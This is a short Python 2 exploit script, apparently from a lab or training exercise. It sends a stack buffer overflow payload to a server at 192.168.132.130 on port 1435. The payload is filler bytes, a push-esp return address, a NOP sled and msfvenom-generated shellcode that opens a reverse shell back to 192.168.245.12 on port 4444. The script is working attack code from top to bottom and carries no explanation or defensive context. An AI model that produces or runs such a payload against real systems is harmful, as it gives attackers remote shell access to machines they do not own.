#!/usr/bin/python

import socket
import sys
import struct
import time
import os

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.245.12 LPORT=4444 -f py -b "\x00"

buf =  b""
buf += b"\xbb\x3b\x14\x66\x5d\xdb\xc8\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
buf += b"\x52\x31\x58\x12\x83\xc0\x04\x03\x63\x1a\x84\xa8\x6f\xca\xca"
buf += b"\x53\x8f\x0b\xab\xda\x6a\x3a\xeb\xb9\xff\x6d\xdb\xca\xad\x81"
buf += b"\x90\x9f\x45\x11\xd4\x37\x6a\x92\x53\x6e\x45\x23\xcf\x52\xc4"
buf += b"\xa7\x12\x87\x26\x99\xdc\xda\x27\xde\x01\x16\x75\xb7\x4e\x85"
buf += b"\x69\xbc\x1b\x16\x02\x8e\x8a\x1e\xf7\x47\xac\x0f\xa6\xdc\xf7"
buf += b"\x8f\x49\x30\x8c\x99\x51\x55\xa9\x50\xea\xad\x45\x63\x3a\xfc"
buf += b"\xa6\xc8\x03\x30\x55\x10\x44\xf7\x86\x67\xbc\x0b\x3a\x70\x7b"
buf += b"\x71\xe0\xf5\x9f\xd1\x63\xad\x7b\xe3\xa0\x28\x08\xef\x0d\x3e"
buf += b"\x56\xec\x90\x93\xed\x08\x18\x12\x21\x99\x5a\x31\xe5\xc1\x39"
buf += b"\x58\xbc\xaf\xec\x65\xde\x0f\x50\xc0\x95\xa2\x85\x79\xf4\xaa"
buf += b"\x6a\xb0\x06\x2b\xe5\xc3\x75\x19\xaa\x7f\x11\x11\x23\xa6\xe6"
buf += b"\x56\x1e\x1e\x78\xa9\xa1\x5f\x51\x6e\xf5\x0f\xc9\x47\x76\xc4"
buf += b"\x09\x67\xa3\x4b\x59\xc7\x1c\x2c\x09\xa7\xcc\xc4\x43\x28\x32"
buf += b"\xf4\x6c\xe2\x5b\x9f\x97\x65\xa4\xc8\x13\xf4\x4c\x0b\x1b\xe6"
buf += b"\xd1\x82\xfd\x62\xfa\xc2\x56\x1b\x63\x4f\x2c\xba\x6c\x45\x49"
buf += b"\xfc\xe7\x6a\xae\xb3\x0f\x06\xbc\x24\xe0\x5d\x9e\xe3\xff\x4b"
buf += b"\xb6\x68\x6d\x10\x46\xe6\x8e\x8f\x11\xaf\x61\xc6\xf7\x5d\xdb"
buf += b"\x70\xe5\x9f\xbd\xbb\xad\x7b\x7e\x45\x2c\x09\x3a\x61\x3e\xd7"
buf += b"\xc3\x2d\x6a\x87\x95\xfb\xc4\x61\x4c\x4a\xbe\x3b\x23\x04\x56"
buf += b"\xbd\x0f\x97\x20\xc2\x45\x61\xcc\x73\x30\x34\xf3\xbc\xd4\xb0"
buf += b"\x8c\xa0\x44\x3e\x47\x61\x74\x75\xc5\xc0\x1d\xd0\x9c\x50\x40"
buf += b"\xe3\x4b\x96\x7d\x60\x79\x67\x7a\x78\x08\x62\xc6\x3e\xe1\x1e"
buf += b"\x57\xab\x05\x8c\x58\xfe"

pushesp = struct.pack("<I", 0x52501513)
host = '192.168.132.130'
buffer = "A" * 13 + pushesp + "\x90" * 20 + buf + "\x00"

k = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

try:
       k.connect((host, 1435))
       print "[*] The program has successfully connected to the server."
       print "[+] Sending our payload...this will take a minute"
except:
       print "[!] The program didn't recieve a response from the target."
       sys.exit(1)

k.send("%s\r\n" %buffer)

k.close()